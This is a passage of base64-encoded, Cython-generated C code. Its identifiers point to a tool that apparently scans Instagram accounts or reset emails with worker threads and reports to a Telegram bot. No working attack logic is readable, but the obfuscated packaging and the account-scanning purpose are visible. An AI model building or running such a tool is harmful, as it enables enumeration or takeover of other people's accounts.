jb21fYXBpX3YxX2FjYyksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc190X21lX0dIT1NUX1JGWCwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfdF9tZV9HSE9TVF9SRlgpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaHR0cHNfdF9tZV92NmY0QzYxZDBMTmpORFpoLCBzaXplb2YoX19weXhfa19odHRwc190X21lX3Y2ZjRDNjFkMExOak5EWmgpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20sIHNpemVvZihfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2FwaV9ncmFwLCBzaXplb2YoX19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcCksIDAsIDEsIDB9LCAKICB7X19weXhfa19odHRwc193d3dfaW5zdGFncmFtX2NvbV9jcmlzdGlhbiwgc2l6ZW9mKF9fcHl4X2tfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfaSwgc2l6ZW9mKF9fcHl4X2tfaSksIDAsIDEsIDF9LCAKICB7X19weXhfa19pX2luc3RhZ3JhbV9jb20sIHNpemVvZihfX3B5eF9rX2lfaW5zdGFncmFtX2NvbSksIDAsIDEsIDB9LCAKICB7X19weXhfa19pZ19zaWdfa2V5X3ZlcnNpb24sIHNpemVvZihfX3B5eF9rX2lnX3NpZ19rZXlfdmVyc2lvbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19pbmNyZW1lbnRfY291bnRlciwgc2l6ZW9mKF9fcHl4X2tfaW5jcmVtZW50X2NvdW50ZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaW5mb2luc3RhLCBzaXplb2YoX19weXhfa19pbmZvaW5zdGEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaW5pdCwgc2l6ZW9mKF9fcHl4X2tfaW5pdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19pbml0aWFsaXppbmcsIHNpemVvZihfX3B5eF9rX2luaXRpYWxpemluZyksIDAsIDEsIDF9LCAKICB7X19weXhfa19pbmxpbmVfa2V5Ym9hcmQsIHNpemVvZihfX3B5eF9rX2lubGluZV9rZXlib2FyZCksIDAsIDEsIDF9LCAKICB7X19weXhfa19pbnB1dCwgc2l6ZW9mKF9fcHl4X2tfaW5wdXQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaXNQcmFpc2UsIHNpemVvZihfX3B5eF9rX2lzUHJhaXNlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzX2Nvcm91dGluZSwgc2l6ZW9mKF9fcHl4X2tfaXNfY29yb3V0aW5lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzX3ByaXZhdGUsIHNpemVvZihfX3B5eF9rX2lzX3ByaXZhdGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfaXNfdmVyaWZpZWQsIHNpemVvZihfX3B5eF9rX2lzX3ZlcmlmaWVkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2lzZW5hYmxlZCwgc2l6ZW9mKF9fcHl4X2tfaXNlbmFibGVkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX2l0ZW1zLCBzaXplb2YoX19weXhfa19pdGVtcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19qc29uLCBzaXplb2YoX19weXhfa19qc29uKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2ssIHNpemVvZihfX3B5eF9rX2spLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfa2VlcF9hbGl2ZSwgc2l6ZW9mKF9fcHl4X2tfa2VlcF9hbGl2ZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19rZXksIHNpemVvZihfX3B5eF9rX2tleSksIDAsIDEsIDF9LCAKICB7X19weXhfa19sb2NrLCBzaXplb2YoX19weXhfa19sb2NrKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2xzZCwgc2l6ZW9mKF9fcHl4X2tfbHNkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX2xzZF90b2tlbiwgc2l6ZW9mKF9fcHl4X2tfbHNkX3Rva2VuKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21fdGZfcHksIHNpemVvZihfX3B5eF9rX21fdGZfcHkpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfbWFpbiwgc2l6ZW9mKF9fcHl4X2tfbWFpbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19tYXRjaCwgc2l6ZW9mKF9fcHl4X2tfbWF0Y2gpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbWF4X3dvcmtlcnMsIHNpemVvZihfX3B5eF9rX21heF93b3JrZXJzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21kNSwgc2l6ZW9mKF9fcHl4X2tfbWQ1KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21lZGlhX2NvdW50LCBzaXplb2YoX19weXhfa19tZWRpYV9jb3VudCksIDAsIDEsIDF9LCAKICB7X19weXhfa19tZXRhLCBzaXplb2YoX19weXhfa19tZXRhKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21ldGFjbGFzcywgc2l6ZW9mKF9fcHl4X2tfbWV0YWNsYXNzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QLCBzaXplb2YoX19weXhfa19taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCksIDAsIDEsIDB9LCAKICB7X19weXhfa19tb2RlbF9udW1iZXIsIHNpemVvZihfX3B5eF9rX21vZGVsX251bWJlciksIDAsIDEsIDF9LCAKICB7X19weXhfa19tb2R1bGUsIHNpemVvZihfX3B5eF9rX21vZHVsZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19uMSwgc2l6ZW9mKF9fcHl4X2tfbjEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbjIsIHNpemVvZihfX3B5eF9rX24yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX25hbWUsIHNpemVvZihfX3B5eF9rX25hbWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbmFtZV8yLCBzaXplb2YoX19weXhfa19uYW1lXzIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbmV4dCwgc2l6ZW9mKF9fcHl4X2tfbmV4dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19udCwgc2l6ZW9mKF9fcHl4X2tfbnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfbnVsbCwgc2l6ZW9mKF9fcHl4X2tfbnVsbCksIDAsIDEsIDB9LCAKICB7X19weXhfa19udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsLCBzaXplb2YoX19weXhfa19udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX28sIHNpemVvZihfX3B5eF9rX28pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfb2ssIHNpemVvZihfX3B5eF9rX29rKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX29wZW4sIHNpemVvZihfX3B5eF9rX29wZW4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfb3JpZ2luLCBzaXplb2YoX19weXhfa19vcmlnaW4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfb3JpZ2luYWxfZW1haWwsIHNpemVvZihfX3B5eF9rX29yaWdpbmFsX2VtYWlsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX29zLCBzaXplb2YoX19weXhfa19vcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19wYXJhbXMsIHNpemVvZihfX3B5eF9rX3BhcmFtcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19wYXlsb2FkLCBzaXplb2YoX19weXhfa19wYXlsb2FkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3BrLCBzaXplb2YoX19weXhfa19wayksIDAsIDEsIDF9LCAKICB7X19weXhfa19wb3AsIHNpemVvZihfX3B5eF9rX3BvcCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wb3N0LCBzaXplb2YoX19weXhfa19wb3N0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3BwLCBzaXplb2YoX19weXhfa19wcCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcmVwYXJlLCBzaXplb2YoX19weXhfa19wcmVwYXJlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3ByaW50LCBzaXplb2YoX19weXhfa19wcmludCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcmlvcml0eSwgc2l6ZW9mKF9fcHl4X2tfcHJpb3JpdHkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcHl0eiwgc2l6ZW9mKF9fcHl4X2tfcHl0eiksIDAsIDEsIDF9LCAKICB7X19weXhfa19xY29tX2VuX1VTXzU0NTk4Niwgc2l6ZW9mKF9fcHl4X2tfcWNvbV9lbl9VU181NDU5ODYpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfcXVhbG5hbWUsIHNpemVvZihfX3B5eF9rX3F1YWxuYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3F1ZXJ5LCBzaXplb2YoX19weXhfa19xdWVyeSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yLCBzaXplb2YoX19weXhfa19yKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmRpbnQsIHNpemVvZihfX3B5eF9rX3JhbmRpbnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmFuZG9tLCBzaXplb2YoX19weXhfa19yYW5kb20pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmFuZHJhbmdlLCBzaXplb2YoX19weXhfa19yYW5kcmFuZ2UpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmFuZ2UsIHNpemVvZihfX3B5eF9rX3JhbmdlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlLCBzaXplb2YoX19weXhfa19yZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZWFkLCBzaXplb2YoX19weXhfa19yZWFkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlZCwgc2l6ZW9mKF9fcHl4X2tfcmVkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlZmVyZXIsIHNpemVvZihfX3B5eF9rX3JlZmVyZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVuZGVyLCBzaXplb2YoX19weXhfa19yZW5kZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVwbHlfbWFya3VwLCBzaXplb2YoX19weXhfa19yZXBseV9tYXJrdXApLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVxdWVzdHMsIHNpemVvZihfX3B5eF9rX3JlcXVlc3RzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlczEsIHNpemVvZihfX3B5eF9rX3JlczEpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVzZXRfZW1haWwsIHNpemVvZihfX3B5eF9rX3Jlc2V0X2VtYWlsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Jlc29sdXRpb24sIHNpemVvZihfX3B5eF9rX3Jlc29sdXRpb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcmVzcG9uc2UsIHNpemVvZihfX3B5eF9rX3Jlc3BvbnNlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Jlc3QsIHNpemVvZihfX3B5eF9rX3Jlc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcnIsIHNpemVvZihfX3B5eF9rX3JyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3J1biwgc2l6ZW9mKF9fcHl4X2tfcnVuKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3J1bm5pbmcsIHNpemVvZihfX3B5eF9rX3J1bm5pbmcpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2Nhbm5lciwgc2l6ZW9mKF9fcHl4X2tfc2Nhbm5lciksIDAsIDEsIDF9LCAKICB7X19weXhfa19zY2FubmVyX3dvcmtlciwgc2l6ZW9mKF9fcHl4X2tfc2Nhbm5lcl93b3JrZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2VhcmNoLCBzaXplb2YoX19weXhfa19zZWFyY2gpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2VsZiwgc2l6ZW9mKF9fcHl4X2tfc2VsZiksIDAsIDEsIDF9LCAKICB7X19weXhfa19zZW5kLCBzaXplb2YoX19weXhfa19zZW5kKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NlbmRNZXNzYWdlLCBzaXplb2YoX19weXhfa19zZW5kTWVzc2FnZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZXJ2ZXJfdGltZXN0YW1wcywgc2l6ZW9mKF9fcHl4X2tfc2VydmVyX3RpbWVzdGFtcHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2V0X2FjdGl2ZV90aHJlYWRzLCBzaXplb2YoX19weXhfa19zZXRfYWN0aXZlX3RocmVhZHMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2V0X25hbWUsIHNpemVvZihfX3B5eF9rX3NldF9uYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NodXRkb3duLCBzaXplb2YoX19weXhfa19zaHV0ZG93biksIDAsIDEsIDF9LCAKICB7X19weXhfa19zaWduZWRfYm9keSwgc2l6ZW9mKF9fcHl4X2tfc2lnbmVkX2JvZHkpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2xlZXAsIHNpemVvZihfX3B5eF9rX3NsZWVwKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwYWNlLCBzaXplb2YoX19weXhfa19zcGFjZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19zcGVjLCBzaXplb2YoX19weXhfa19zcGVjKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwbGl0LCBzaXplb2YoX19weXhfa19zcGxpdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zcGxpdGxpbmVzLCBzaXplb2YoX19weXhfa19zcGxpdGxpbmVzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NzLCBzaXplb2YoX19weXhfa19zcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19zdGFydCwgc2l6ZW9mKF9fcHl4X2tfc3RhcnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3RhdHVzX2NvZGUsIHNpemVvZihfX3B5eF9rX3N0YXR1c19jb2RlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0cmluZywgc2l6ZW9mKF9fcHl4X2tfc3RyaW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N1Ym1pdCwgc2l6ZW9mKF9fcHl4X2tfc3VibWl0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N1bSwgc2l6ZW9mKF9fcHl4X2tfc3VtKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N5cywgc2l6ZW9mKF9fcHl4X2tfc3lzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N5c3RlbSwgc2l6ZW9mKF9fcHl4X2tfc3lzdGVtKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rlc3QsIHNpemVvZihfX3B5eF9rX3Rlc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGV4dCwgc2l6ZW9mKF9fcHl4X2tfdGV4dCksIDAsIDEsIDF9LCAKICB7X19weXhfa190Ziwgc2l6ZW9mKF9fcHl4X2tfdGYpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGhyZWFkaW5nLCBzaXplb2YoX19weXhfa190aHJlYWRpbmcpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGhyb3csIHNpemVvZihfX3B5eF9rX3Rocm93KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RpbWUsIHNpemVvZihfX3B5eF9rX3RpbWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGltZW91dCwgc2l6ZW9mKF9fcHl4X2tfdGltZW91dCksIDAsIDEsIDF9LCAKICB7X19weXhfa190bCwgc2l6ZW9mKF9fcHl4X2tfdGwpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGxfbWF0Y2gsIHNpemVvZihfX3B5eF9rX3RsX21hdGNoKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RsX3R4dCwgc2l6ZW9mKF9fcHl4X2tfdGxfdHh0KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3RsbCwgc2l6ZW9mKF9fcHl4X2tfdGxsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rvaywgc2l6ZW9mKF9fcHl4X2tfdG9rKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rva2VuLCBzaXplb2YoX19weXhfa190b2tlbiksIDAsIDEsIDF9LCAKICB7X19weXhfa190b3RhbCwgc2l6ZW9mKF9fcHl4X2tfdG90YWwpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdHJ1ZSwgc2l6ZW9mKF9fcHl4X2tfdHJ1ZSksIDAsIDEsIDF9LCAKICB7X19weXhfa191XzFfaSwgc2l6ZW9mKF9fcHl4X2tfdV8xX2kpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfdWEsIHNpemVvZihfX3B5eF9rX3VhKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VpZCwgc2l6ZW9mKF9fcHl4X2tfdWlkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Vua25vd24sIHNpemVvZihfX3B5eF9rX3Vua25vd24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdW5rbm93bl9jb20sIHNpemVvZihfX3B5eF9rX3Vua25vd25fY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3VybCwgc2l6ZW9mKF9fcHl4X2tfdXJsKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXIsIHNpemVvZihfX3B5eF9rX3VzZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXNlcklELCBzaXplb2YoX19weXhfa191c2VySUQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXNlcl9hZ2VudCwgc2l6ZW9mKF9fcHl4X2tfdXNlcl9hZ2VudCksIDAsIDEsIDB9LCAKICB7X19weXhfa191c2VyX2FnZW50XzIsIHNpemVvZihfX3B5eF9rX3VzZXJfYWdlbnRfMiksIDAsIDEsIDF9LCAKICB7X19weXhfa191c2VyX2lkLCBzaXplb2YoX19weXhfa191c2VyX2lkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJfaW5mbywgc2l6ZW9mKF9fcHl4X2tfdXNlcl9pbmZvKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3VzZXJuYW1lLCBzaXplb2YoX19weXhfa191c2VybmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWksIHNpemVvZihfX3B5eF9rX3V1aSksIDAsIDEsIDF9LCAKICB7X19weXhfa191dWlkLCBzaXplb2YoX19weXhfa191dWlkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3V1aWQ0LCBzaXplb2YoX19weXhfa191dWlkNCksIDAsIDEsIDF9LCAKICB7X19weXhfa192YWx1ZSwgc2l6ZW9mKF9fcHl4X2tfdmFsdWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdmFsdWVzLCBzaXplb2YoX19weXhfa192YWx1ZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdmFyaWFibGVzLCBzaXplb2YoX19weXhfa192YXJpYWJsZXMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdywgc2l6ZW9mKF9fcHl4X2tfdyksIDAsIDEsIDF9LCAKICB7X19weXhfa193YWl0LCBzaXplb2YoX19weXhfa193YWl0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3dlYmJyb3dzZXIsIHNpemVvZihfX3B5eF9rX3dlYmJyb3dzZXIpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfd2hpdGUsIHNpemVvZihfX3B5eF9rX3doaXRlKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3dpZCwgc2l6ZW9mKF9fcHl4X2tfd2lkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3dvcmtlcl9pZCwgc2l6ZW9mKF9fcHl4X2tfd29ya2VyX2lkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3dyaXRlLCBzaXplb2YoX19weXhfa193cml0ZSksIDAsIDEsIDF9LCAKICB7X19weXhfa194LCBzaXplb2YoX19weXhfa194KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3hfZmJfZnJpZW5kbHlfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfeF9mYl9mcmllbmRseV9uYW1lKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3hfZmJfbHNkLCBzaXplb2YoX19weXhfa194X2ZiX2xzZCksIDAsIDEsIDB9LCAKICB7X19weXhfa195eSwgc2l6ZW9mKF9fcHl4X2tfeXkpLCAwLCAxLCAxfSwgCiAgezAsIDAsIDAsIDAsIDB9Cn07CgpzdGF0aWMgaW50IF9fUHl4X0luaXRTdHJpbmdzKF9fUHl4X1N0cmluZ1RhYkVudHJ5IGNvbnN0ICp0LCBQeU9iamVjdCAqKnRhcmdldCwgY29uc3QgY2hhciogY29uc3QqIGVuY29kaW5nX25hbWVzKTsKCgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX3B5eF9idWlsdGluX3ByaW50ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHJpbnQpOyBpZiAoIV9fcHl4X2J1aWx0aW5fcHJpbnQpIF9fUFlYX0VSUigwLCAyOCwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfYnVpbHRpbl9LZXlib2FyZEludGVycnVwdCA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0tleWJvYXJkSW50ZXJydXB0KTsgaWYgKCFfX3B5eF9idWlsdGluX0tleWJvYXJkSW50ZXJydXB0KSBfX1BZWF9FUlIoMCwgNDg4LCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9idWlsdGluX29wZW4gPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vcGVuKTsgaWYgKCFfX3B5eF9idWlsdGluX29wZW4pIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X2J1aWx0aW5fcmFuZ2UgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5nZSk7IGlmICghX19weXhfYnVpbHRpbl9yYW5nZSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9idWlsdGluX3N1bSA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3N1bSk7IGlmICghX19weXhfYnVpbHRpbl9zdW0pIF9fUFlYX0VSUigwLCA0NDQsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X2J1aWx0aW5faW5wdXQgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbnB1dCk7IGlmICghX19weXhfYnVpbHRpbl9pbnB1dCkgX19QWVhfRVJSKDAsIDQ3MSwgX19weXhfTDFfZXJyb3IpCiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIHJldHVybiAtMTsKfQoKCnN0YXRpYyBpbnQgX19QeXhfSW5pdENhY2hlZENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMiLCAwKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0gPSBQeVR1cGxlX1BhY2soMywgUHlfTm9uZSwgUHlfTm9uZSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0pKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzMwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90bF90eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGxfdHh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfd